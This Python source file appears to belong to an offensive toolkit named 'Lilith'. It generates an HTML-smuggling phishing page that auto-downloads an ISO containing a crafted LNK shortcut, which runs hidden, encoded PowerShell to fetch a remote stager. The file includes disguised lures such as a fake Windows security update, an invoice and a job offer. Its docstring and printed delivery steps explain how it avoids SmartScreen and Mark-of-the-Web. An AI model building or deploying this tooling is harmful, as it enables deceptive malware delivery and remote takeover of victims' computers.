"""
Lilith — HTML Smuggling → ISO → LNK delivery

Browser loads lure page → JS assembles ISO from embedded base64 blob → auto-downloads.
User double-clicks ISO → Windows mounts it as a drive letter.
User double-clicks LNK inside → powershell.exe runs hidden via -enc.

Two clicks. Zero SmartScreen. Works on fully patched Windows.

Why it bypasses SmartScreen:
  - ISO download triggered by Blob URL (no network-level AV scanning, no MOTW on blob)
  - Files inside an ISO inherit no Mark-of-the-Web from the container
  - .lnk extension hidden by Windows Explorer by default — looks like any document

ISO creation: uses pycdlib (pure Python).
  pip install pycdlib   OR   pip install pycdlib --break-system-packages
"""

import base64
import io
import os
import shutil
import struct
import subprocess
import tempfile

import pycdlib

from .stager import _compact_exec_loader

# LNK resolves powershell.exe via EnvironmentVariableDataBlock — no IDList needed
_PS_ENV  = r'%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe'
_PS_DIR  = r'C:\Windows\System32\WindowsPowerShell\v1.0'

_LNK_NAME_DEFAULT = 'Windows Security Update'   # Explorer hides .lnk — looks like a doc
_ISO_NAME_DEFAULT = 'WindowsSecurityUpdate.iso'
_ISO_VOL_DEFAULT  = 'Security'

LURE_PRESETS = {
    "update":  ("Windows Security Update",    "A required security update is ready to install on your device."),
    "invoice": ("Invoice",                     "Your invoice is attached. Open to view details."),
    "report":  ("Security Assessment Report",  "Your report is ready to download and review."),
    "offer":   ("Job Offer Letter",            "Your offer letter is ready. Download to review."),
}

_SHIELD_SVG = (
    '<svg xmlns="http://www.w3.org/2000/svg" width="52" height="52" viewBox="0 0 52 52">'
    '<path d="M26 4L10 11v15c0 10.8 7.4 20.9 16 24 8.6-3.1 16-13.2 16-24V11L26 4z" fill="#0078d4"/>'
    '<path d="M21 28l-5-5-2.5 2.5 7.5 7.5 13-13-2.5-2.5L21 28z" fill="#fff"/>'
    '</svg>'
)


# ── LNK ──────────────────────────────────────────────────────────────────────

def _ustr(s: str) -> bytes:
    """MS-SHLLINK StringData: CountCharacters (LE uint16) + UTF-16LE data."""
    return struct.pack('<H', len(s)) + s.encode('utf-16-le')


def _lnk_bytes(ps_lines: list) -> bytes:
    """Minimal .lnk → powershell.exe -enc <stager> (hidden, no window).

    Target resolved via EnvironmentVariableDataBlock (%WINDIR%\\..\\powershell.exe).
    Stager is base64/-enc encoded — avoids all shell quoting issues with the payload.
    ShowCommand=7 (SW_SHOWMINNOACTIVE) + -w h in args = no visible window.
    """
    payload   = ";".join(ps_lines)
    enc_cmd   = base64.b64encode(payload.encode('utf-16-le')).decode()
    arguments = f'-ep bypass -w h -enc {enc_cmd}'

    # HasWorkingDir(0x10) | HasArguments(0x20) | IsUnicode(0x80) | HasExpEnvStrings(0x200)
    link_flags = 0x10 | 0x20 | 0x80 | 0x200

    hdr = bytearray(76)
    struct.pack_into('<I', hdr,  0, 0x4C)       # HeaderSize = 76
    hdr[4:20] = bytes([                          # LinkCLSID {00021401-0000-0000-C000-…46}
        0x01,0x14,0x02,0x00, 0x00,0x00, 0x00,0x00,
        0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46])
    struct.pack_into('<I', hdr, 20, link_flags)  # LinkFlags
    struct.pack_into('<I', hdr, 24, 0x20)        # FileAttributes = ARCHIVE
    struct.pack_into('<I', hdr, 60, 7)           # ShowCommand = SW_SHOWMINNOACTIVE

    string_data = _ustr(_PS_DIR) + _ustr(arguments)

    # EnvironmentVariableDataBlock (0xA0000001): expands %WINDIR% → actual PS path
    # BlockSize=788 = 4+4+260(TargetAnsi)+520(TargetUnicode)
    t_ansi  = _PS_ENV.encode('ascii').ljust(260, b'\x00')[:260]
    t_uni   = _PS_ENV.encode('utf-16-le').ljust(520, b'\x00')[:520]
    env_blk = struct.pack('<II', 788, 0xA0000001) + t_ansi + t_uni
    terminal = struct.pack('<I', 0)

    return bytes(hdr) + string_data + env_blk + terminal


# ── ISO ───────────────────────────────────────────────────────────────────────

def _iso_bytes(lnk_data: bytes, lnk_filename: str, vol_label: str = _ISO_VOL_DEFAULT) -> bytes:
    """Build a Joliet ISO image containing a single LNK file using pycdlib.

    Falls back to genisoimage/mkisofs/xorriso subprocess if pycdlib is unavailable.
    """
    # ── pycdlib (pure Python, preferred) ─────────────────────────────────────
    try:
        iso = pycdlib.PyCdlib()
        iso.new(joliet=3, vol_ident=vol_label[:32])

        # ISO 9660 requires uppercase 8.3 name; Joliet carries the real long name
        iso9660_name = 'WINSUPD.LNK;1'
        joliet_path  = f'/{lnk_filename}'

        iso.add_fp(
            io.BytesIO(lnk_data),
            len(lnk_data),
            iso_path    = f'/{iso9660_name}',
            joliet_path = joliet_path,
        )

        buf = io.BytesIO()
        iso.write_fp(buf)
        iso.close()
        return buf.getvalue()

    except Exception as e:
        print(f"[!] pycdlib failed ({e}), falling back to system tools...")

    # ── subprocess fallback (genisoimage / mkisofs / xorriso) ────────────────
    with tempfile.TemporaryDirectory() as tmp:
        content = os.path.join(tmp, 'contents')
        os.makedirs(content)
        iso_out = os.path.join(tmp, 'out.iso')

        with open(os.path.join(content, lnk_filename), 'wb') as f:
            f.write(lnk_data)

        for tool in ('genisoimage', 'mkisofs', 'xorriso'):
            if not shutil.which(tool):
                continue
            cmd = (['xorriso', '-as', 'mkisofs'] if tool == 'xorriso' else [tool])
            cmd += ['-J', '-o', iso_out, '-V', vol_label[:32], content]
            r = subprocess.run(cmd, capture_output=True, text=True)
            if r.returncode == 0:
                with open(iso_out, 'rb') as f:
                    return f.read()
            raise RuntimeError(f"{tool}: {r.stderr.strip()}")

    raise RuntimeError(
        "ISO creation failed.\n"
        "  pip install pycdlib --break-system-packages\n"
        "  OR: sudo apt install genisoimage"
    )


# ── HTML smuggling page ───────────────────────────────────────────────────────

def _smuggle_html(iso_b64: str, iso_filename: str, lnk_display: str, lure: str) -> str:
    title, desc = LURE_PRESETS.get(lure, LURE_PRESETS['update'])
    return f"""\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'Segoe UI',Arial,sans-serif;background:#f0f0f0;
     display:flex;justify-content:center;align-items:center;min-height:100vh}}
.wrap{{background:#fff;border-radius:4px;padding:40px 48px;max-width:460px;
       width:100%;box-shadow:0 2px 12px rgba(0,0,0,.12);text-align:center}}
.icon{{margin-bottom:18px}}
h1{{font-size:20px;font-weight:600;color:#1a1a1a;margin-bottom:10px}}
p{{color:#555;font-size:14px;margin-bottom:24px;line-height:1.6}}
.steps{{text-align:left;font-size:13px;color:#333;margin-bottom:8px;
        background:#f8f8f8;border-radius:3px;padding:14px 18px;line-height:1.9}}
.note{{font-size:11px;color:#bbb;margin-top:14px}}
</style>
</head>
<body>
<div class="wrap">
  <div class="icon">{_SHIELD_SVG}</div>
  <h1>{title}</h1>
  <p>{desc}</p>
  <ol class="steps">
    <li>Open the downloaded <strong>{iso_filename}</strong></li>
    <li>Double-click <strong>{lnk_display}</strong> inside</li>
  </ol>
  <div class="note">{iso_filename} &mdash; downloading automatically&hellip;</div>
</div>
<script>
(function(){{
  var b="{iso_b64}";
  var r=atob(b),a=new Uint8Array(r.length);
  for(var i=0;i<r.length;i++)a[i]=r.charCodeAt(i);
  var u=URL.createObjectURL(new Blob([a],{{type:'application/octet-stream'}}));
  var el=document.createElement('a');
  el.href=u;el.download="{iso_filename}";
  document.body.appendChild(el);el.click();
  setTimeout(function(){{URL.revokeObjectURL(u);document.body.removeChild(el);}},3000);
}})();
</script>
</body>
</html>"""


# ── public API ────────────────────────────────────────────────────────────────

def build_smuggle_payload(
    stager_url: str,
    output_dir: str,
    lure:       str = 'update',
    lnk_name:   str = _LNK_NAME_DEFAULT,
    iso_name:   str = _ISO_NAME_DEFAULT,
) -> bool:
    """Generate a self-contained HTML smuggling page embedding an ISO with a LNK stager.

    stager_url : HTTPS URL of the stager served by 'lilith serve'
    output_dir : directory to write index.html into (must be workspace root for serving)
    lure       : page theme — update | invoice | report | offer
    lnk_name   : LNK display name inside the ISO (.lnk extension hidden by Explorer)
    iso_name   : ISO filename shown in the browser download bar
    """
    os.makedirs(output_dir, exist_ok=True)

    print("[*] Building stager...")
    lines = _compact_exec_loader(stager_url)

    print("[*] Building LNK...")
    lnk_data = _lnk_bytes(lines)
    print(f"    {len(lnk_data)} bytes  →  '{lnk_name}.lnk'")

    print("[*] Packaging ISO...")
    iso_data = _iso_bytes(lnk_data, lnk_name + '.lnk')
    iso_b64  = base64.b64encode(iso_data).decode()
    print(f"    {len(iso_data)//1024}KB ISO  →  '{iso_name}'")

    print("[*] Generating HTML smuggling page...")
    html      = _smuggle_html(iso_b64, iso_name, lnk_name, lure)
    html_path = os.path.join(output_dir, 'index.html')
    with open(html_path, 'w', encoding='utf-8') as f:
        f.write(html)

    print(f"\n[+] {html_path}")
    print(f"    Page size : {len(html)//1024}KB  (ISO embedded as base64 blob)")
    print()
    print(f"[*] Delivery:")
    print(f"    URL   : https://<lhost>:<port>/cdn/static/v3/index.html")
    print(f"    Click 1 : open {iso_name}  →  Windows mounts it as a drive")
    print(f"    Click 2 : double-click '{lnk_name}'  →  PS runs hidden, session in ~30s")
    print(f"    MOTW  : none on ISO contents — SmartScreen bypassed entirely")
    print(f"    Lure  : {lure}  (--smuggle-lure: {' | '.join(LURE_PRESETS)})")

    return True
